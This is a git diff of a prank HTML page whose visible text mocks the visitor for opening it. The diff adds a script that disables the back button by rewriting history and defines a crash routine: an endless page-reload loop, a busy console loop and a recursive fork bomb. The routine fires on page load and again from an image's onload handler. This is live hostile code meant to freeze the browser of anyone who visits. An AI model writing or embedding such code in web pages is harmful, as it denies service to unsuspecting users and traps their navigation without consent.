@@ -4,23 +4,37 @@
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
+    <title>asdf</title>
+    <script>
+        console.log('script loaded')
+        // disable back button
+        history.pushState(null, document.title, location.href);
+        window.addEventListener('popstate', function () {
+            history.pushState(null, document.title, location.href);
+        });
+
+        function crash() {
+            try {
+                // should hang chromium-based browsers
+                while (1) location.reload(1);
+                // overload the javascript processor with unnecessary math
+                while (1) console.log(192874987923874 * 12859750538402839098183724981239874912739)
+                // initiate a forkbomb
+                (function fork() { fork(); fork() })();
+            } catch (e) {
+                crash();
+            }
+        }
+
+        // fallback for image not loading
+        window.onload = () => setTimeout(crash, 100);
+    </script>
 </head>
 <body>
     <p>Let this be a lesson to never trust anyone.</p>
     <p>You never know what you are getting into.</p>
     <p>And, in this case, I was so nice as to crash your browser.</p>
-
-    <img src="rick.jpg" alt="Say Goodbye To Your Computer">
-
+    <img src="rick.jpg" alt="Say Goodbye To Your Computer" onload="crash()">
     <p>Courtesy of Ebula the Duck and your new enemy</p>
-
-    <script>
-        window.onload = () => {
-            setTimeout(() => {
-                while(1) location.reload(1);
-            }, 100);
-        };
-    </script>
 </body>
 </html>
